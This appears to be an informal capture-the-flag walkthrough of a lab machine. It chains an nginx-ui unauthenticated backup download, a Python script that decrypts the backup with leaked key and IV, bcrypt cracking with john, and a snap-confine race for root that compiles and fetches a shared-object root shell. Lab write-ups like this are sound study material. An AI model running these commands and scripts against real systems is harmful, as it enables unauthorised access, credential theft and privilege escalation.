
![](https://cdn-images-1.medium.com/max/1000/1*qY4xA4nM3L3poHkI7QieuA.png)

check the website

![](https://cdn-images-1.medium.com/max/1000/1*EHAndmTgg9CpuJHo2gBwXg.png)

fuzz the subdomain,we found admin

![](https://cdn-images-1.medium.com/max/1000/1*w6CaAtqJ5lml4dDwNe4MYw.png)

check the admin

![](https://cdn-images-1.medium.com/max/1000/1*xdXO_S2GXJDAQxPoztsowQ.png)

we found this

cve-2026–27944

![](https://cdn-images-1.medium.com/max/1000/1*QO3AsNVO92mRAl7aQRRBMQ.png)

so use

**_  
curl -v -X GET “$TARGET/api/backup” \  
 -H “User-Agent: Mozilla/5.0” \  
 — output backup_encrypted.tar.gz \  
 — dump-header response_headers.txt 2>&1 | tee full_response.log_**

![](https://cdn-images-1.medium.com/max/1500/1*ntqaK8bn_nkuPywefrf8pQ.png)

![](https://cdn-images-1.medium.com/max/1000/1*PiyPvtAiJvNHQ2dQ_3R1zQ.png)

it works

![](https://cdn-images-1.medium.com/max/1000/1*YKARd5lcxAWFXP977VXbFQ.png)

ok， with the help of ai

we got this

![](https://cdn-images-1.medium.com/max/1000/1*ALjp2Fsdk4u-0XTQ0uIg6A.png)

  

than use

> **_import base64  
> from Crypto.Cipher import AES  
> from Crypto.Util.Padding import unpad_**

> **_# 漏洞响应头里拿到的 Key 和 IV  
> b64_key = “5gG82yiLZgiGhnJgx5xV86oZjceUth9GK35AamkNmRA=”  
> b64_iv = “egj9kpMwank1H0+6wJXv4g==”_**

> **_key = base64.b64decode(b64_key)  
> iv = base64.b64decode(b64_iv)_**

> **_def decrypt_file(filename, output_name):  
>  print(f”[*] 正在解密: {filename} …”)  
>  with open(filename, “rb”) as f:  
>  data = f.read()  
>    
>  try:  
>  cipher = AES.new(key, AES.MODE_CBC, iv=iv)  
>  # 解密并去除 PKCS7 填充  
>  decrypted = unpad(cipher.decrypt(data), AES.block_size)  
>    
>  with open(output_name, “wb”) as f:  
>  f.write(decrypted)  
>  print(f”[+] 成功解密! 已保存为: {output_name}”)  
>  except Exception as e:  
>  print(f”[-] {filename} 解密失败: {e}”)_**

> **_# 执行解密  
> decrypt_file(“nginx-ui.zip”, “nginx-ui-fixed.zip”)  
> decrypt_file(“nginx.zip”, “nginx-fixed.zip”)_**

we got 

![](https://cdn-images-1.medium.com/max/1000/1*mlaWodaS4uJRbU1pUgzHqA.png)

than,we got

![](https://cdn-images-1.medium.com/max/1000/1*hgIXdbPjho5ZdUg0WdgIcA.png)

so,check the database at first.

sqlite3 database.db

![](https://cdn-images-1.medium.com/max/1000/1*ZV9bUDQKCTGSuX2nU4d7sA.png)

we found users

![](https://cdn-images-1.medium.com/max/1000/1*I7ztWZbdB_I9IJATrPZbsw.png)

we got the hashes

so,use

**_john — format=bcrypt — wordlist=/usr/share/wordlists/rockyou.txt hashes.txt_**

and we got this

![](https://cdn-images-1.medium.com/max/1000/1*tG51gh_RP-p9n97Wnh2_hA.png)

its jonathan`s password

![](https://cdn-images-1.medium.com/max/1000/1*BhFGMw0MyzW5lQTZXoAEgQ.png)

and we got a user flag

![](https://cdn-images-1.medium.com/max/1000/1*4OsNKJTEOOTD0h9-yZl3hg.png)

**_9aa4d5d86b9a14ed1c9b15015db0a917_**

than 

Privilege Escalation

but you know what

we got copy fail

siu — 

![](https://cdn-images-1.medium.com/max/1000/1*-oCLrOXFY4mKqA6T-rL4iA.png)

***02aa0a2ea3cef2fa82bfa08949ccb899***


here is the right way 

first,

![[Pasted image 20260519131744.png]]

we got snaapped

so, we found # CVE-2026-3888

but still not so sure

so,

![[Pasted image 20260519132021.png]]

it means allow any unprivileged regular user to create isolated user namespaces.
 you will be a root when you execute something at a sandbox

Systemd-tmpfiles periodically cleans up expired files under /tmp.

After it deletes the /tmp/.snap directory used by Snap applications, an attacker can race to create a directory with the same name as an unprivileged user and plant malicious files inside it (such as a .so file you compile).

When the Snap application starts again, the snap-confine program, which runs with root privileges, mistakenly trusts and uses this directory that has already been tampered with by the attacker, causing the malicious code to execute with root privileges.
 
 
![[Pasted image 20260519133510.png]]

so add a new user and ssh 

![[Pasted image 20260519133805.png]]

use 

gcc -nostdlib -static -Wl,--entry=start -o librootshell.so librootshell.c

![[Pasted image 20260519134348.png]]

than,wget it and run， we got it.

![[Pasted image 20260519135327.png]]


![[Pasted image 20260519135644.png]]

![[Pasted image 20260519140045.png]]

remember change the code it works.